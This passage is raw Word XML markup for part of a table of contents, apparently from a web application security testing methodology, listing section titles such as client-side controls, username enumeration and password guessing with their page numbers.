          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="880"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104334" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.3</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test Client-Side Controls</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104334 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>8</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="00958981" w14:textId="367A273C" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104335" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.3.1</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test Transmission of Data Via the Client</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104335 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>8</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="03C8D9C8" w14:textId="3AF6D653" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104336" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.3.2</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test Client-Side Controls Over User Input</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104336 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>10</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4B577ECF" w14:textId="4CCA3FA7" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="880"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104337" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.4</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test the Authentication Mechanism</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104337 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>11</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="76A8B687" w14:textId="6B138B17" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104338" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.4.1</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test Password Quality</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104338 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>11</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="416F4624" w14:textId="76D9E0A7" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104339" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.4.2</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test for Username Enumeration</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104339 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>12</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="64E29889" w14:textId="135F8FA0" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104340" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.4.3</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test Resilience to Password Guessing</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104340 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>13</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6402A838" w14:textId="4E8F2AD3" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104341" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.4.4</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test the Remember Me Function</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104341 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>13</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="54FC4E20" w14:textId="4DA0F848" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104342" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.4.5</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test Username Uniqueness</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104342 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>14</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6E4DFD09" w14:textId="76F77328" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104343" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.4.6</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Check for Unsafe Transmission of Credentials</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104343 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>14</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="40F13330" w14:textId="26D5907D" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104344" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.4.7</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test for Logic Flaws</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104344 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>15</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="00458817" w14:textId="14E087BB" w:rsidR="00616D9E" w:rsidRDefault="00EA689B">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1320"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc531104345" w:history="1">
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.4.8</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E" w:rsidRPr="006D43C2">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Exploit Vulnerabilities to Gain Unauthorized Access</w:t>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc531104345 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="00616D9E">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
